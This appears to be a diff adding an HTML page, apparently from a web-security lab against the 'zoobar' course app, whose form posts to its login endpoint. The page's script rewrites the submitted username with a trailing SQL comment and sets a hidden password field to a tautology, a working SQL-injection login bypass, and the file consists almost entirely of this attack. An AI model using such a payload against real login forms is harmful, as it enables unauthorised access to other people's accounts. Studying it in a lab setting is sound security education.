@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+  <body>
+     <form method="POST" name="loginform" onsubmit="sqlInjection()" action="http://zoobar.org/index.php">
+      	<label id="usernameLabel"> Username: </label>
+      	<input type=text name=login_username id=username/>
+      	<input type=hidden name=login_password id=password value="000"/>
+      	<input type=submit name=submit_login value="Login"/>
+    </form>
+
+    <script>
+	function sqlInjection() {
+	  document.getElementById('username').value = document.getElementById('username').value + "'--";
+	  document.getElementById('password').value = "' or '1'='1";
+	  alert(document.getElementById('password').value);
+	  return true;
+	}
+    </script>
+
+  </body>
+</html>
